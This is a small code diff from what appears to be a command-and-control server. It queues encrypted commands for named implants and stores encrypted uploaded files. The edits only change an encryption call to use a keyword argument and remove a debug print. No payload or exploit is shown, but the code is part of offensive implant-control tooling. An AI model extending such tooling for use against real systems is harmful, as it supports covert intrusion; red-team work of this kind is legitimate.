@@ -36,7 +36,7 @@ AES_INSTANCE = encryption.AESCipher(ENC_KEY)
 def store_and_queue_command(cmd_str: str, implant_command: storage.ImplantCommand, operator_name: str):
     
     # Encrypt the command
-    enc_cmd_str = AES_INSTANCE.encrypt(cmd_str)
+    enc_cmd_str = AES_INSTANCE.encrypt(raw_str=cmd_str)
 
     # Add the encrypted command string to the implants queue
     implant_db.dict[implant_command.implant_name].queue_command(enc_cmd_str)
@@ -163,7 +163,6 @@ def str_command():
             # Encrypt the file!
             file.seek(0)
             file_bytes = file.read()
-            print(type(file_bytes))
             # Need to decode it from bytes first to get it to work in the encryptin 
             enc_file = AES_INSTANCE.encrypt(file_bytes)
             with open(os.path.join(app.config['UPLOAD_FOLDER'], file_id), "wb") as f:
